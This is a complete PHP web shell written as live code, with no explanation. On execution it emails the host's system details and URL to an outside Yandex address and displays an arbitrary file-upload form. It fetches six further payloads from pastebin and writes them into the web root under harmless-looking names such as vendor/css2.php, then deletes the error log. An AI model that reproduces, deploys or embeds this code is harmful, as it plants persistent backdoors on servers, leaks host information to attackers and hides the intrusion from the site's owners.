<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
$system =@php_uname();
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'tuyulmama@yandex.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "$$Duarmemek$$ " . "$x_path";
mail($tujuanmail, $system , $pesan_alert,"[ " . $_SERVER['SERVER_NAME'] . " ]");
error_reporting(0);

	{
		echo"<font color=#F52887>[uname]".php_uname()."[/uname]<br>";
		echo "<font color=#F52887>[pwd]".getcwd()."[/pwd]<br>";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "DisablePHP=".$disable_functions; print "<br>"; 
		echo"<form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
		  if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Ok</b>-->".$_FILES["f"]["name"];}else{echo"<b>error";}}  
{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}};
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/sl.php" ;
$text2 = http_get('https://pastebin.com/raw/4fmxFr53');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vendor/css2.php" ;
$text2 = http_get('https://pastebin.com/raw/KN6bjEb2');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/hi.php" ;
$text2 = http_get('https://pastebin.com/raw/PLYMe911');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/app/hello.php" ;
$text2 = http_get('https://pastebin.com/raw/nFk3CUZu');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/vendor/up.php" ;
$text1244 = http_get('https://pastebin.com/raw/cqhpYwLq');
$open1244 = fopen($check1244, 'w');
fwrite($open1244, $text1244);
fclose($open1244);
if(file_exists($check1244)){
}
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/002bestwifu.php" ;
$text1244 = http_get('https://pastebin.com/raw/gAwKsk9x');
$open1244 = fopen($check1244, 'w');
fwrite($open1244, $text1244);
fclose($open1244);
if(file_exists($check1244)){
}
$ip2=$_SERVER['SERVER_ADDR'];
echo "IP LUR = $ip2";
unlink("error_log");
?>